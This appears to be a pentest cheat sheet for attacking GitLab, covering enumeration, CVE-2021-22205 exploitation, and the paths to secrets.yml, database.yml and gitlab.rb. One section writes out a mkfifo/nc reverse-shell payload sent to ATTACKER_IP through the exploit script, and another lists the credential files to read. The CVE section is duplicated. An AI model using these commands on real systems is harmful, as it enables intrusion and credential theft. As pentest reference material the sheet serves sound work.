# GitLab

## Discovery

- Default ports: 80, 443
- Login page: `/users/sign_in`
- API: `/api/v4/`

---

## Version Enumeration

```bash
# In page source or footer
curl -s http://TARGET | grep 'gitlab'

# Via API (if accessible)
curl -s http://TARGET/api/v4/version
```

---

## Username Enumeration

GitLab rate limits enumeration by default (`config/initializers/devise.rb`):

```ruby
config.lock_strategy = :failed_attempts
config.maximum_attempts = 10
```

### Registration Page Enumeration

If registration is enabled, try registering with known usernames - error if exists.

---

## Public Repositories

```bash
# Browse public projects
http://TARGET/explore/projects

# User profiles
http://TARGET/users/USERNAME
```

---

## Authenticated RCE (CVE-2021-22205)

**Affects:** GitLab CE/EE < 13.10.3, 13.9.6, 13.8.8

```bash
# ExifTool metadata parsing RCE
# Exploit available on GitHub
python3 exploit.py -u http://TARGET -c 'id'
```

---

## Import Feature RCE

Older versions allow importing malicious project files:

1. Create malicious repo with hooks
2. Import via `New Project → Import`
3. Hooks execute on clone/push

---

## API Token Theft

If you have file read:

```bash
# GitLab Rails secrets
/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml

# Database config
/var/opt/gitlab/gitlab-rails/etc/database.yml

# GitLab config
/etc/gitlab/gitlab.rb
```

---

## Default Paths

| Path | Description |
|------|-------------|
| `/opt/gitlab/` | GitLab Omnibus install |
| `/var/opt/gitlab/` | GitLab data |
| `/var/log/gitlab/` | Logs |
| `/etc/gitlab/gitlab.rb` | Main config |

---

## Authenticated RCE (CVE-2021-22205)

**Affects:** GitLab CE/EE < 13.10.3, < 13.9.6, < 13.8.8

ExifTool metadata parsing RCE. Works if you can register an account.

```bash
# Exploit
python3 gitlab_13_10_2_rce.py -t http://TARGET -u username -p password -c 'id'

# Reverse shell
python3 gitlab_13_10_2_rce.py -t http://TARGET -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 8443 >/tmp/f'
```

**PoC:** https://www.exploit-db.com/exploits/49951

---

## Username Enumeration

```bash
# Enumeration script
./gitlab_userenum.sh --url http://TARGET:8081/ --userlist users.txt
```

Registration page also reveals if username/email exists.

---

## CVEs

| CVE | Description |
|-----|-------------|
| CVE-2021-22205 | Auth RCE via ExifTool (< 13.10.3) |
| CVE-2021-22214 | SSRF via webhook |
| CVE-2020-10977 | Arbitrary file read |
| CVE-2018-19571 | SSRF + CRLF |